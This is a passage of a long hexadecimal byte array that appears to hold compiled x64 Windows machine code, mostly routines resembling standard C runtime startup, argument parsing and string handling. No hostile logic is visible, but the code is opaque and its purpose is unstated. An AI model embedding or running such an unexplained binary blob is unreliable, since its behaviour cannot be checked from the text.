0xe8, 0x18, 0x32, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xff, 0x7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x48, 0xff, 0xc7, 0x40, 0x84, 0xf6, 0x74, 0x1c, 0x40, 0x84, 0xed, 0x75, 0xb0, 0x40, 0x80, 0xfe, 0x20, 0x74, 0x6, 0x40, 0x80, 0xfe, 0x9, 0x75, 0xa4, 0x48, 0x85, 0xdb, 0x74, 0x9, 0xc6, 0x43, 0xff, 0x0, 0xeb, 0x3, 0x48, 0xff, 0xcf, 0x40, 0x32, 0xf6, 0x8a, 0x7, 0x84, 0xc0, 0xf, 0x84, 0xd4, 0x0, 0x0, 0x0, 0x3c, 0x20, 0x74, 0x4, 0x3c, 0x9, 0x75, 0x7, 0x48, 0xff, 0xc7, 0x8a, 0x7, 0xeb, 0xf1, 0x84, 0xc0, 0xf, 0x84, 0xbd, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xf6, 0x74, 0x7, 0x49, 0x89, 0x1e, 0x49, 0x83, 0xc6, 0x8, 0x49, 0xff, 0x4, 0x24, 0xba, 0x1, 0x0, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x5, 0x48, 0xff, 0xc7, 0xff, 0xc0, 0x8a, 0xf, 0x80, 0xf9, 0x5c, 0x74, 0xf4, 0x80, 0xf9, 0x22, 0x75, 0x30, 0x84, 0xc2, 0x75, 0x18, 0x40, 0x84, 0xf6, 0x74, 0xa, 0x38, 0x4f, 0x1, 0x75, 0x5, 0x48, 0xff, 0xc7, 0xeb, 0x9, 0x33, 0xd2, 0x40, 0x84, 0xf6, 0x40, 0xf, 0x94, 0xc6, 0xd1, 0xe8, 0xeb, 0x10, 0xff, 0xc8, 0x48, 0x85, 0xdb, 0x74, 0x6, 0xc6, 0x3, 0x5c, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0x85, 0xc0, 0x75, 0xec, 0x8a, 0x7, 0x84, 0xc0, 0x74, 0x46, 0x40, 0x84, 0xf6, 0x75, 0x8, 0x3c, 0x20, 0x74, 0x3d, 0x3c, 0x9, 0x74, 0x39, 0x85, 0xd2, 0x74, 0x2d, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x8a, 0x7, 0xf, 0xbe, 0xc8, 0xe8, 0x31, 0x31, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xff, 0x7, 0x48, 0xff, 0xc7, 0x48, 0x85, 0xdb, 0x74, 0x7, 0x8a, 0x7, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0x48, 0xff, 0xc7, 0xe9, 0x66, 0xff, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0x6, 0xc6, 0x3, 0x0, 0x48, 0xff, 0xc3, 0x49, 0xff, 0x7, 0xe9, 0x22, 0xff, 0xff, 0xff, 0x4d, 0x85, 0xf6, 0x74, 0x4, 0x49, 0x83, 0x26, 0x0, 0x49, 0xff, 0x4, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x1f, 0x4c, 0x8b, 0xca, 0x48, 0x3b, 0xc8, 0x73, 0x3d, 0x33, 0xd2, 0x48, 0x83, 0xc8, 0xff, 0x49, 0xf7, 0xf0, 0x4c, 0x3b, 0xc8, 0x73, 0x2f, 0x48, 0xc1, 0xe1, 0x3, 0x4d, 0xf, 0xaf, 0xc8, 0x48, 0x8b, 0xc1, 0x48, 0xf7, 0xd0, 0x49, 0x3b, 0xc1, 0x76, 0x1c, 0x49, 0x3, 0xc9, 0xba, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x12, 0x17, 0x0, 0x0, 0x33, 0xc9, 0x48, 0x8b, 0xd8, 0xe8, 0x80, 0x17, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x30, 0x33, 0xff, 0x44, 0x8b, 0xf1, 0x85, 0xc9, 0xf, 0x84, 0x53, 0x1, 0x0, 0x0, 0x8d, 0x41, 0xff, 0x83, 0xf8, 0x1, 0x76, 0x16, 0xe8, 0xab, 0x16, 0x0, 0x0, 0x8d, 0x5f, 0x16, 0x89, 0x18, 0xe8, 0x65, 0x15, 0x0, 0x0, 0x8b, 0xfb, 0xe9, 0x35, 0x1, 0x0, 0x0, 0xe8, 0x7d, 0x2c, 0x0, 0x0, 0x48, 0x8d, 0x1d, 0xa6, 0x48, 0x1, 0x0, 0x41, 0xb8, 0x4, 0x1, 0x0, 0x0, 0x48, 0x8b, 0xd3, 0x33, 0xc9, 0xe8, 0x4a, 0x23, 0x0, 0x0, 0x48, 0x8b, 0x35, 0x6f, 0x4c, 0x1, 0x0, 0x48, 0x89, 0x1d, 0x48, 0x4c, 0x1, 0x0, 0x48, 0x85, 0xf6, 0x74, 0x5, 0x40, 0x38, 0x3e, 0x75, 0x3, 0x48, 0x8b, 0xf3, 0x48, 0x8d, 0x45, 0x48, 0x48, 0x89, 0x7d, 0x40, 0x4c, 0x8d, 0x4d, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x7d, 0x48, 0x33, 0xd2, 0x48, 0x8b, 0xce, 0xe8, 0x49, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0x7d, 0x40, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x55, 0x48, 0x49, 0x8b, 0xcf, 0xe8, 0xf3, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x18, 0xe8, 0x1e, 0x16, 0x0, 0x0, 0xbb, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x18, 0xe8, 0xa8, 0x16, 0x0, 0x0, 0xe9, 0x6a, 0xff, 0xff, 0xff, 0x4e, 0x8d, 0x4, 0xf8, 0x48, 0x8b, 0xd3, 0x48, 0x8d, 0x45, 0x48, 0x48, 0x8b, 0xce, 0x4c, 0x8d, 0x4d, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0xf7, 0xfc, 0xff, 0xff, 0x41, 0x83, 0xfe, 0x1, 0x75, 0x16, 0x8b, 0x45, 0x40, 0xff, 0xc8, 0x48, 0x89, 0x1d, 0xc5, 0x4b, 0x1, 0x0, 0x89, 0x5, 0xb7, 0x4b, 0x1, 0x0, 0x33, 0xc9, 0xeb, 0x69, 0x48, 0x8d, 0x55, 0x38, 0x48, 0x89, 0x7d, 0x38, 0x48, 0x8b, 0xcb, 0xe8, 0x6b, 0x21, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x74, 0x19, 0x48, 0x8b, 0x4d, 0x38, 0xe8, 0x4c, 0x16, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7d, 0x38, 0xe8, 0x40, 0x16, 0x0, 0x0, 0x8b, 0xfe, 0xeb, 0x3f, 0x48, 0x8b, 0x55, 0x38, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0xc2, 0x48, 0x39, 0x3a, 0x74, 0xc, 0x48, 0x8d, 0x40, 0x8, 0x48, 0xff, 0xc1, 0x48, 0x39, 0x38, 0x75, 0xf4, 0x89, 0xd, 0x63, 0x4b, 0x1, 0x0, 0x33, 0xc9, 0x48, 0x89, 0x7d, 0x38, 0x48, 0x89, 0x15, 0x5e, 0x4b, 0x1, 0x0, 0xe8, 0x9, 0x16, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7d, 0x38, 0xe8, 0xfd, 0x15, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xff, 0x48, 0x39, 0x3d, 0x5d, 0x48, 0x1, 0x0, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x4f, 0xe8, 0x1a, 0x2b, 0x0, 0x0, 0xe8, 0xd, 0x30, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xc, 0x33, 0xc9, 0xe8, 0xb6, 0x15, 0x0, 0x0, 0x83, 0xc8, 0xff, 0xeb, 0x31, 0x48, 0x8b, 0xcb, 0xe8, 0x35, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x5, 0x83, 0xcf, 0xff, 0xeb, 0xe, 0x48, 0x89, 0x5, 0x38, 0x48, 0x1, 0x0, 0x48, 0x89, 0x5, 0x19, 0x48, 0x1, 0x0, 0x33, 0xc9, 0xe8, 0x8a, 0x15, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x82, 0x15, 0x0, 0x0, 0x8b, 0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xf1, 0x33, 0xc9, 0x4c, 0x8b, 0xc6, 0x8a, 0x16, 0xeb, 0x25, 0x80, 0xfa, 0x3d, 0x48, 0x8d, 0x41, 0x1, 0x48, 0xf, 0x44, 0xc1, 0x48, 0x8b, 0xc8, 0x48, 0x83, 0xc8, 0xff, 0x48, 0xff, 0xc0, 0x41, 0x80, 0x3c, 0x0, 0x0, 0x75, 0xf6, 0x49, 0xff, 0xc0, 0x4c, 0x3, 0xc0, 0x41, 0x8a, 0x10, 0x84, 0xd2, 0x75, 0xd7, 0x48, 0xff, 0xc1, 0xba, 0x8, 0x0, 0x0, 0x0, 0xe8, 0xa1, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xb, 0x33, 0xc9, 0xe8, 0xa, 0x15, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x72, 0x4c, 0x8b, 0xf3, 0x8a, 0x6, 0x84, 0xc0, 0x74, 0x5f, 0x48, 0x83, 0xcd, 0xff, 0x48, 0xff, 0xc5, 0x80, 0x3c, 0x2e, 0x0, 0x75, 0xf7, 0x48, 0xff, 0xc5, 0x3c, 0x3d, 0x74, 0x35, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcd, 0xe8, 0x64, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x25, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xc8, 0xe8, 0xea, 0x4, 0x0, 0x0, 0x33, 0xc9, 0x85, 0xc0, 0x75, 0x47, 0x49, 0x89, 0x3e, 0x49, 0x83, 0xc6, 0x8, 0xe8, 0xb4, 0x14, 0x0, 0x0, 0x48, 0x3, 0xf5, 0xeb, 0xac, 0x48, 0x8b, 0xcb, 0xe8, 0x43, 0x0, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0xa0, 0x14, 0x0, 0x0, 0xeb, 0x8d, 0x33, 0xc9, 0xe8, 0x97, 0x14, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xb2, 0x12, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x3b, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0xeb, 0xf, 0x48, 0x8b, 0xc8, 0xe8, 0x42, 0x14, 0x0, 0x0, 0x48, 0x8d, 0x7f, 0x8, 0x48, 0x8b, 0x7, 0x48, 0x85, 0xc0, 0x75, 0xec, 0x48, 0x8b, 0xcb, 0xe8, 0x2e, 0x14, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0xb2, 0x46, 0x1, 0x0, 0x74, 0x5, 0xe8, 0xa7, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0x8e, 0x46, 0x1, 0x0, 0x74, 0x5, 0xe8, 0x8b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x38, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x5c, 0x46, 0x1, 0x0, 0xe8, 0xaf, 0xff, 0xff, 0xff, 0x90, 0x48, 0x8d, 0xd, 0x57, 0x46, 0x1, 0x0, 0xe8, 0xbe, 0xff, 0xff, 0xff, 0x90, 0x48, 0x8b, 0xd, 0x5a, 0x46, 0x1, 0x0, 0xe8, 0x51, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xd, 0x46, 0x46, 0x1, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xe9, 0x41, 0xff, 0xff, 0xff, 0xcc, 0xe9, 0xb7, 0xfd, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x78, 0xd, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xcf, 0xe8, 0x17, 0x0, 0x0, 0x0, 0x8b, 0xf8, 0x8b, 0xb, 0xe8, 0xba, 0xd, 0x0, 0x0, 0x8b, 0xc7, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0xf1, 0x48, 0x8b, 0x18, 0x48, 0x85, 0xdb, 0x75, 0x8, 0x83, 0xc8, 0xff, 0xe9, 0xd9, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x3b, 0x4c, 0x8b, 0x5, 0x48, 0x38, 0x1, 0x0, 0x48, 0x8b, 0x5b, 0x8, 0x49, 0x33, 0xf8, 0x49, 0x33, 0xd8, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xcf, 0x48, 0xd3, 0xcb, 0x48, 0x8d, 0x47, 0xff, 0x48, 0x83, 0xf8, 0xfd, 0xf, 0x87, 0xa9, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc8, 0x4d, 0x8b, 0xf0, 0x83, 0xe1, 0x3f, 0x4c, 0x8b, 0xff, 0x48, 0x8b, 0xeb, 0x48, 0x83, 0xeb, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0x5f, 0x48, 0x8b, 0x3, 0x49, 0x3b, 0xc6, 0x74, 0xef, 0x49, 0x33, 0xc0, 0x4c, 0x89, 0x33, 0x48, 0xd3, 0xc8, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0x73, 0x99, 0x0, 0x0, 0x4c, 0x8b, 0x5, 0xe4, 0x37, 0x1, 0x0, 0x48, 0x8b, 0x6, 0x41, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x8b, 0x10, 0x4c, 0x8b, 0xa, 0x48, 0x8b, 0x42, 0x8, 0x4d, 0x33, 0xc8, 0x49, 0x33, 0xc0, 0x49, 0xd3, 0xc9, 0x48, 0xd3, 0xc8, 0x4d, 0x3b, 0xcf, 0x75, 0x5, 0x48, 0x3b, 0xc5, 0x74, 0xa6, 0x4d, 0x8b, 0xf9, 0x49, 0x8b, 0xf9, 0x48, 0x8b, 0xe8, 0x48, 0x8b, 0xd8, 0xeb, 0x98, 0x48, 0x83, 0xff, 0xff, 0x74, 0xf, 0x48, 0x8b, 0xcf, 0xe8, 0x7f, 0x12, 0x0, 0x0, 0x4c, 0x8b, 0x5, 0x98, 0x37, 0x1, 0x0, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x1, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x41, 0x8, 0x48, 0x8b, 0x6, 0x48, 0x8b, 0x8, 0x4c, 0x89, 0x41, 0x10, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x4b, 0x8, 0x48, 0x83, 0xec, 0x38, 0x49, 0xc7, 0x43, 0xf0, 0xfe, 0xff, 0xff, 0xff, 0x49, 0x8d, 0x43, 0x8, 0x49, 0x89, 0x43, 0xe8, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x50, 0x89, 0x44, 0x24, 0x58, 0x4d, 0x8d, 0x4b, 0x18, 0x4d, 0x8d, 0x43, 0xe8, 0x49, 0x8d, 0x53, 0x20, 0x49, 0x8d, 0x4b, 0x10, 0xe8, 0x67, 0xfe, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0x48, 0x85, 0xc9, 0x75, 0x4, 0x83, 0xc8, 0xff, 0xc3, 0x48, 0x8b, 0x41, 0x10, 0x48, 0x39, 0x1, 0x75, 0x12, 0x48, 0x8b, 0x5, 0x3, 0x37, 0x1, 0x0, 0x48, 0x89, 0x1, 0x48, 0x89, 0x41, 0x8, 0x48, 0x89, 0x41, 0x10, 0x33, 0xc0, 0xc3, 0xcc, 0x48, 0x8d, 0x5, 0x7d, 0x3c, 0x1, 0x0, 0x48, 0x89, 0x5, 0xe, 0x4d, 0x1, 0x0, 0xb0, 0x1, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8d, 0xd, 0x5d, 0x44, 0x1, 0x0, 0xe8, 0xb4, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x69, 0x44, 0x1, 0x0, 0xe8, 0xa8, 0xff, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xb0, 0x1, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa7, 0xfd, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x1d, 0x9b, 0x36, 0x1, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x2b, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x73, 0x35, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x5b, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x13, 0x39, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x97, 0xf7, 0xff, 0xff, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x33, 0xc9, 0xe9, 0xd9, 0xcb, 0xff, 0xff, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd, 0x63, 0x46, 0x1, 0x0, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x1, 0x83, 0xf8, 0x1, 0x75, 0x1f, 0x48, 0x8b, 0xd, 0x50, 0x46, 0x1, 0x0, 0x48, 0x8d, 0x1d, 0x89, 0x36, 0x1, 0x0, 0x48, 0x3b, 0xcb, 0x74, 0xc, 0xe8, 0xf, 0x11, 0x0, 0x0, 0x48, 0x89, 0x1d, 0x38, 0x46, 0x1, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xd, 0x55, 0x4c, 0x1, 0x0, 0xe8, 0xf0, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x51, 0x4c, 0x1, 0x0, 0x48, 0x83, 0x25, 0x41, 0x4c, 0x1, 0x0, 0x0, 0xe8, 0xdc, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x25, 0x46, 0x1, 0x0, 0x48, 0x83, 0x25, 0x35, 0x4c, 0x1, 0x0, 0x0, 0xe8, 0xc8, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x19, 0x46, 0x1, 0x0, 0x48, 0x83, 0x25, 0x9, 0x46, 0x1, 0x0, 0x0, 0xe8, 0xb4, 0x10, 0x0, 0x0, 0x48, 0x83, 0x25, 0x4, 0x46, 0x1, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x8d, 0x15, 0x8d, 0xaa, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x86, 0xa9, 0x0, 0x0, 0xe9, 0xbd, 0x33, 0x0, 0x0, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x4f, 0x8, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x7f, 0x6, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x84, 0xc9, 0x74, 0x16, 0x48, 0x83, 0x3d, 0xb4, 0x4b, 0x1, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x89, 0x3b, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x8d, 0x15, 0x37, 0xaa, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x30, 0xa9, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xf7, 0x33, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xb7, 0x9, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x6b, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0xaa, 0x96, 0x0, 0x0, 0xeb, 0x0, 0xe8, 0x7f, 0x0, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0xc7, 0x44, 0x24, 0x10, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x44, 0x24, 0x10, 0xe9, 0xe7, 0xf, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xe9, 0xaf, 0x3c, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x85, 0xc9, 0x74, 0xc, 0x48, 0x85, 0xd2, 0x74, 0x7, 0x4d, 0x85, 0xc0, 0x75, 0x1b, 0x88, 0x19, 0xe8, 0x26, 0xf, 0x0, 0x0, 0xbb, 0x16, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0xde, 0xd, 0x0, 0x0, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x4c, 0x8b, 0xc9, 0x4c, 0x2b, 0xc1, 0x43, 0x8a, 0x4, 0x8, 0x41, 0x88, 0x1, 0x49, 0xff, 0xc1, 0x84, 0xc0, 0x74, 0xe4, 0x48, 0x83, 0xea, 0x1, 0x75, 0xec, 0x48, 0x85, 0xd2, 0x75, 0xd9, 0x88, 0x19, 0xe8, 0xec, 0xe, 0x0, 0x0, 0xbb, 0x22, 0x0, 0x0, 0x0, 0xeb, 0xc4, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x3b, 0x34, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xa, 0xb9, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x7c, 0x34, 0x0, 0x0, 0xf6, 0x5, 0xad, 0x34, 0x1, 0x0, 0x2, 0x74, 0x2a, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xf8, 0x93, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xba, 0x15, 0x0, 0x0, 0x40, 0x41, 0x8d, 0x48, 0x2, 0xe8, 0x8d, 0xa, 0x0, 0x0, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x83, 0xf5, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0x39, 0x0, 0x48, 0x8b, 0xf9, 0x75, 0x49, 0x48, 0x89, 0x5c, 0x24, 0x38, 0xff, 0x15, 0xd6, 0x93, 0x0, 0x0, 0x80, 0x7f, 0x10, 0x0, 0x89, 0x44, 0x24, 0x30, 0x75, 0xc, 0x33, 0xd2, 0xc6, 0x47, 0x10, 0x1, 0x48, 0x89, 0x57, 0x8, 0xeb, 0x4, 0x48, 0x8b, 0x57, 0x8, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0x72, 0x7, 0x0, 0x0, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x7, 0xff, 0x15, 0xaa, 0x93, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x74, 0x9, 0x48, 0x8b, 0x7, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x3e, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0xe8, 0x79, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x57, 0x18, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0xf0, 0x4c, 0x8b, 0x80, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x2, 0x4c, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x4c, 0x89, 0x47, 0x20, 0x4c, 0x8b, 0x47, 0x8, 0xe8, 0xd5, 0x3b, 0x0, 0x0, 0x4c, 0x8b, 0x47, 0x8, 0x48, 0x8d, 0x57, 0x20, 0x48, 0x8b, 0xce, 0xe8, 0x31, 0x3c, 0x0, 0x0, 0x8b, 0x86, 0xa8, 0x3, 0x0, 0x0, 0xa8, 0x2, 0x75, 0xd, 0x83, 0xc8, 0x2, 0x89, 0x86, 0xa8, 0x3, 0x0, 0x0, 0xc6, 0x47, 0x28, 0x2, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 